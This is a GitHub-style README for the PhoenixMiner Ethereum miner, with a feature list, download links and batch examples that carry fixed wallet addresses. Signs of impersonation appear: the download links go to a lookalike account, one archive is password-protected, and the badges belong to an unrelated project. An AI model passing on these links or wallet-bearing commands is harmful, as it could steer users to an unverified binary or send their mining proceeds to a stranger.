<p align="center">
<a href="https://github.com/PhoenixMiner/PhoenixMiner/releases/download/4.2c/PhoenixMiner_4.2c_Windows.zip" alt="PhoenixMiner ethereum miner">
<img src="https://github.com/Phoenix-Miner/PhoenixMiner/blob/master/files/git-files/phoenix-heade3r.jpg?raw=true" /></a>
</p>

<p align="center">
<a href="https://github.com/PhoenixMiner/PhoenixMiner/releases" alt="Activity">
<img src="https://img.shields.io/github/downloads/xmrig/xmrig/total.svg" /></a>

<a href="https://github.com/PhoenixMiner/PhoenixMiner/blob/master/License.txt" alt="Activity">
<img src="https://img.shields.io/github/license/xmrig/xmrig-amd.svg" /></a>
<a href="#" alt="Activity">
<img src="https://img.shields.io/github/release-date-pre/xmrig/xmrig-amd.svg" /></a>
<a href="https://github.com/PhoenixMiner/PhoenixMiner/pulse" alt="Activity">
<img src="https://img.shields.io/github/commit-activity/m/badges/shields.svg" /></a>
<a href="#">
<img src="https://img.shields.io/circleci/project/github/badges/shields/master.svg" alt="build status"></a>
</p>

# 	PhoenixMiner: fastest Ethereum/Ethash miner with lowest devfee (Win/Linux)
<p>PhoenixMiner is high performance Ethereum (ETH) and ERC20 tokens  miner, with the official full Windows / Linux support.
</p>
<p align="center">
<a href="https://github.com/PhoenixMiner/PhoenixMiner/releases/download/4.2c/PhoenixMiner_4.2c_Windows.zip" alt="PhoenixMiner ethereum miner">
<img src="https://github.com/PhoenixMiner/PhoenixMiner/blob/master/files/git-files/ethereum-hashrate.png" /></a>
</p>

<p>PhoenixMiner is one of the most efficient and convenient miners to date, which is why it won the general recognition of miners.
</p>

## Table of Contents
- [Features, requirements, and limitations](#Features-requirements-and-limitations)
- [Download](#Download)
- [Usage](#Usage)
- [Example](#example)
- [Auto Restart](#restart)


## Features, requirements, and limitations

* Highly optimized OpenCL and CUDA cores for maximum ethash mining speed
* Official Windows / Linux support.
* Nicehash support.
* Automatic GPU configuration.
* Supports AMD Vega, 580/570/480/470, 460/560, Fury, 390/290 and older AMD GPUs with enough VRAM
* Supports Nvidia 10x0 and 9x0 series as well as older cards with enough VRAM
* Optional "green" kernels for RX580/570/560/480/470/460 to lower the power consumption by 2-3% with small, or no drop in hashrate
* Lowest developer fee of 1% (35 seconds defvee mining per each 90 minutes)
* Dual mining ðŸ’°
* Advanced statistics: actual difficulty of each share, effective hashrate at the pool, and optional showing of estimated income in USD
* DAG file generation in the GPU for faster start-up and DAG epoch switches
* Supports all ethash mining pools and stratum protocols
* Watchdog that monitors your GPU threads, if they stop hashing for a few minutes, miner restarts itself
* Startup monitor, if miner can't init GPU's and start mining in a defined time, restarts itself or runs a user defined script
* Monitoring of GPU temperature, and if a critical temperature is reached, that particular GPU is turned off until it cools down
* Set system shutdown temperature, to protect your GPU's from overheating
* API for rig monitoring


<img src="https://github.com/PhoenixMiner/PhoenixMiner/blob/master/files/git-files/ethereum-mining.jpg" width="795" >

## Download

<p>
<a href="https://github.com/Phoenix-Miner/PhoenixMiner/releases/download/4.2c/PhoenixMiner_4.2c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
<img src="https://github.com/PhoenixMiner/PhoenixMiner/blob/master/files/git-files/download-btn.png" width="300" ></a></p>

* Binary releases: https://github.com/PhoenixMiner/PhoenixMiner/releases
* Git tree: https://github.com/PhoenixMiner/PhoenixMiner.git
  * Clone with `git clone https://github.com/PhoenixMiner/PhoenixMiner.git`  :hammer:
  
## How to use

<li>Step 1 -  Install your GPUs and set up your computer</li>
<li>Step 2 -  <a href="https://github.com/Phoenix-Miner/PhoenixMiner/releases/download/4.2c/PhoenixMiner_4.2c_Windows.Password-phoenix.zip">Download latest PhoenixMiner</a></li>
<li>Step 3 -  Get an Ethereum wallet (<a target="_blank" rel="noopener noreferrer" href="https://github.com/ethereum/mist/releases">Mist</a> or MyEtherWallet)</li>
<li>Step 4 -  Join a <a href="https://github.com/PhoenixMiner/PhoenixMiner/wiki/ETH-Mining-Pools-List-(updated-2019)">mining pool</a></li>
<li>Step 5 -  Start mining!</li>

## Example

### Ethereum - Ethermine.org
```batch
PhoenixMiner.exe -pool eu1.ethermine.org:4444 -wal 0x9147460980c93629e775783148591b7d0a0cbf2d -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
pause
```

### Ethereum - sparkpool.com
```batch
PhoenixMiner.exe -pool eu.sparkpool.com:3333 -wal 0x9147460980c93629e775783148591b7d0a0cbf2d -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
pause
```
### Ethereum - f2pool.com
```batch
PhoenixMiner.exe -pool eth.f2pool.com:8008 -wal 0x1a0e2c4cd699cee12672adc223fdb30b93253eba -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
pause
```




###


###

## PhoenixMiner Auto Restart 

In Windows if you’ve  configured your miner through a batch file then you can easily make the script to loop with this simple command.
```batch
your miner configuration goes here
goto start`
```

**Example:**
```batch
:start
PhoenixMiner.exe -pool eth-eu2.nanopool.org:9999 -wal 0x1a0e2c4cd699cee12672adc223fdb30b93253eba -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
goto start
```
  
